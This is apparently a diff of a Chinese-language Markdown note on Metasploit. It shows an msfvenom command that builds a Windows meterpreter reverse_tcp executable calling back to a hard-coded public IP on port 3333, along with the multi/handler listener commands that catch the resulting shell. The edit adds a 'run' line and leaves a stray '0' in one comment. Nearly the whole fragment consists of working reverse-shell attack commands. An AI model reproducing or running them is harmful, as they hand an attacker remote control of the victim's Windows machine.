@@ -19,9 +19,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.114 LPORT=3333 -f ex
 msf监听反弹shell
 ```
 use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp   //这里的payload要和上面的一直
+set payload windows/meterpreter/reverse_tcp   //这里的payload要和上面的一直0
 set lport 3333
 set lhost 0.0.0.0
+run
 ```
 set lport 3333：
 
